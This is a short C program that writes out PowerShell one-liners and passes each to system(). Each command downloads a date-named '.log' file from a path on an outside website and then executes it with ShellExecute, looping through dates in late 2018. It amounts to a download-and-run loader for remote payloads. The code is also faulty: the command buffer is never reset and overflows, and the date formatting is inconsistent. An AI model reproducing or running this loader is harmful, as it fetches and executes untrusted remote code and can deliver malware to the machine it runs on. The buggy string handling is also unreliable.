
#include <windows.h>
#include <stdio.h>
#include <string.h>
//PowerShell (New-Object System.Net.WebClient).DownloadFile(\'http://www.bravotec.co.kr/plugin/lgxpay/lgdacom/log/log_%d%d%d.log\',\'%d%d%d.log\');(New-Object -com Shell.Application).ShellExecute(\'%d%d%d.log\');

char str[] = "PowerShell (New-Object System.Net.WebClient).DownloadFile(\'http://www.bravotec.co.kr/plugin/lgxpay/lgdacom/log/log_";
char str2[] = ".log\',\'";
char str3[] = ".log\');(New-Object -com Shell.Application).ShellExecute(\'";
char str4[] = ".log\');";
char command[1000];
char time[100]; 
int main() {
	int year=2018, month=8, day=13;
	for (; month <= 12; month++,day=1) {
		for (; day <= 31; day++) {
			sprintf(time, "%d%02d%d", year, month, day);
         strcat(command,str);
         strcat(command,time);
         strcat(command,str2);
         strcat(command,time);
         strcat(command,str3);
         strcat(command,time);
         strcat(command,str4);
         strcat(command,time);   
         printf("%s\n",command);
			system(command);
		}
	}
	return 0;
}